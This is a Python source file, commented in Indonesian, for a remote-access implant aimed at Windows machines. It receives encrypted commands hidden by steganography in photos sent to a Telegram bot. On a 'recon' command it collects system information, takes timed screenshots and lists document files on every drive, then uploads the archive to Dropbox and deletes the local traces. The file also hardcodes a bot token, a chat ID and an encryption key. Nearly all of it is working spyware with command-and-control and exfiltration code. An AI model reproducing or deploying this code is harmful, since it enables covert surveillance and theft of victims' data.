import requests
from PIL import Image
import io
from cryptography.fernet import Fernet
import stepic
import sys
import subprocess
import os
from os import path
import time
import random
import platform
import shutil
import mss
import mss.tools
import win32api

# ==================== CONFIGURATION ====================
key = b'7H0RviHlSUDJ8ug1xf0lm5ZO_JZjWketfjcZ9gzaYZU='
TELKEN = '8210714938:AAHAbovQzWwlr8ZRTGyBvAwCh4QOArFILY4'
CHAID = '5457823680'

# ==================== TELEGRAM FUNCTIONS ====================
def getTo():
    """Mengambil URL foto terbaru dari Bot Telegram"""
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/getUpdates"
        response = requests.get(url, timeout=30)
        if response.status_code == 200:
            data = response.json()
            if data['ok'] and data['result']:
                for update in reversed(data['result']):
                    if 'message' in update and 'photo' in update['message']:
                        photo = update['message']['photo'][-1]
                        file_id = photo['file_id']
                        file_url = f"https://api.telegram.org/bot{TELKEN}/getFile"
                        file_response = requests.get(file_url, params={'file_id': file_id})
                        if file_response.status_code == 200:
                            file_data = file_response.json()
                            if file_data['ok']:
                                file_path = file_data['result']['file_path']
                                return f"https://api.telegram.org/file/bot{TELKEN}/{file_path}"
        return None
    except Exception as e:
        print(f"[-] Telegram error: {e}")
        return None

def decodeFromPhoto(URL):
    """Mendekode pesan steganografi dari foto"""
    try:
        response = requests.get(URL, timeout=30)
        if response.status_code == 200:
            image = Image.open(io.BytesIO(response.content))
            return stepic.decode(image)
    except Exception as e:
        print(f"[-] Decode error: {e}")
        return None

def decrypt(enctext, key):
    """Mendekripsi perintah tersembunyi"""
    enctext = enctext.encode()
    f = Fernet(key)
    plaintext = f.decrypt(enctext)
    return plaintext.decode()

def sendTelResponse(message):
    """Mengirim laporan status kembali ke penyerang"""
    try:
        url = f"https://api.telegram.org/bot{TELKEN}/sendMessage"
        data = {'chat_id': CHAID, 'text': message}
        requests.post(url, json=data, timeout=30)
    except:
        pass

# ==================== RECON FUNCTIONS (UPGRADED) ====================
def rec(APIKEY):
    """Fitur Recon yang sudah disamakan dengan Kode 2"""
    dumppath = path.expandvars(r'%LOCALAPPDATA%\Telkom')
    if not os.path.exists(dumppath):
        os.mkdir(dumppath)
    
    f = Fernet(key)
    
    # 1. System Info
    command = 'systeminfo'
    output = subprocess.Popen(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
    result = output.stdout.read()
    encrypted_result = f.encrypt(result)
    
    sysdumpfile = os.path.join(dumppath, 'systeminfo.telkom')
    with open(sysdumpfile, 'wb') as outfile:
        outfile.write(encrypted_result)
    
    # 2. Multi-Screenshot (Selama 2 menit dengan interval acak)
    print("[*] Memulai pemantauan layar...")
    starttime = time.time()
    endtime = starttime + 120 # Durasi 2 menit
    counter = 0
    while (time.time() < endtime):
        interval = random.randrange(1, 30) # Capture setiap 1-30 detik
        with mss.mss() as screen:
            img = screen.grab(screen.monitors[0])
            data = mss.tools.to_png(img.rgb, img.size, output=None)
            
        encrypted_data = f.encrypt(data)
        sctdumpfile = os.path.join(dumppath, f'screenshot{counter}.telkom')
        with open(sctdumpfile, 'wb') as outfile:
            outfile.write(encrypted_data)
        counter += 1
        time.sleep(min(interval, endtime - time.time()))

    # 3. Pemindaian File Dokumen (.pdf, .docx) di semua Drive
    print("[*] Mencari dokumen sensitif...")
    drives = win32api.GetLogicalDriveStrings().split('\000')[:-1]
    lists = ''
    exts = ['.pdf', '.docx']
    for drive in drives:
        for root, dirs, files in os.walk(drive):
            # Batasi pencarian agar tidak terlalu lama
            if any(x in root for x in ['Windows', 'Program Files', 'AppData']): continue
            for file in files:
                if any(file.endswith(ext) for ext in exts):
                    lists += os.path.join(root, file) + "\n"
    
    encrypted_lists = f.encrypt(lists.encode() if lists else b"No files found")
    juicyfile = os.path.join(dumppath, 'juicyfile.telkom')
    with open(juicyfile, 'wb') as outfile:
        outfile.write(encrypted_lists)
    
    # 4. Packaging (ZIP)
    delivery_name = f'DeliverableIntel_{platform.node()}_{int(time.time())}'
    deliverypath_base = path.expandvars(r'%LOCALAPPDATA%')
    deliveryfile_full = os.path.join(deliverypath_base, delivery_name)
    shutil.make_archive(deliveryfile_full, 'zip', dumppath)
    
    # 5. Eksfiltrasi ke Dropbox
    final_zip = deliveryfile_full + ".zip"
    if APIKEY and APIKEY != "NO_API_KEY":
        try:
            import dropbox
            drop = dropbox.Dropbox(APIKEY)
            targetfile = f"/Telkom/{os.path.basename(final_zip)}"
            with open(final_zip, "rb") as df:
                drop.files_upload(df.read(), targetfile, mode=dropbox.files.WriteMode("overwrite"))
            print(f"[+] Data berhasil dikirim ke Dropbox: {targetfile}")
        except Exception as e:
            print(f"[-] Dropbox error: {e}")
    
    # Cleanup
    shutil.rmtree(dumppath, ignore_errors=True)
    if os.path.exists(final_zip):
        os.remove(final_zip)
    
    return "Recon Full Completed"

# ==================== MAIN LOGIC ====================
def main():
    print(f"[*] Perangkat target: {platform.node()}")
    sendTelResponse(f"Implant aktif di {platform.node()}. Menunggu instruksi gambar...")
    
    while True:
        try:
            photo_url = getTo()
            if photo_url:
                enctext = decodeFromPhoto(photo_url)
                if enctext:
                    command_raw = decrypt(enctext, key)
                    parts = command_raw.split(" ", 1)
                    cmd = parts[0]
                    api = parts[1] if len(parts) > 1 else None
                    
                    if cmd == 'kill':
                        sendTelResponse("Implant dimatikan secara remote.")
                        sys.exit(0)
                    elif cmd == 'recon':
                        sendTelResponse("Memulai Recon Full (2 menit)...")
                        status = rec(api if api else "NO_API_KEY")
                        sendTelResponse(status)
            
            time.sleep(30)
        except Exception as e:
            time.sleep(60)

if __name__ == "__main__":
    main()